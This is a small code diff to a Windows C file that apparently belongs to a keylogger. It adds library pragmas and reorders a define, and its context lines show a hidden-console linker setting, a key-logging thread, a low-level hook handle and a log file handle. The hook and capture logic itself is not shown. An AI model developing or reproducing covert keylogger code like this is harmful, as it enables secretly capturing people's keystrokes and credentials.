@@ -6,13 +6,15 @@
 #include <process.h>
 #include <string.h>
 #pragma warning(disable:4996)
-#define STACK_SIZE 16384
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "msvcrt.lib")
 #pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // Hide console
+#define STACK_SIZE 16384
 #define ONE_MIN 60000 // miliseconds
 #define MAX_FILE_READ 262144 // 256 KB
 
 HANDLE key_log_thread = { 0 };
-BOOL key_log_running = FALSE; 
+BOOL key_log_running = FALSE;
 extern HHOOK hhk_low_level_hook;
 extern HANDLE logger_file_handle;
 
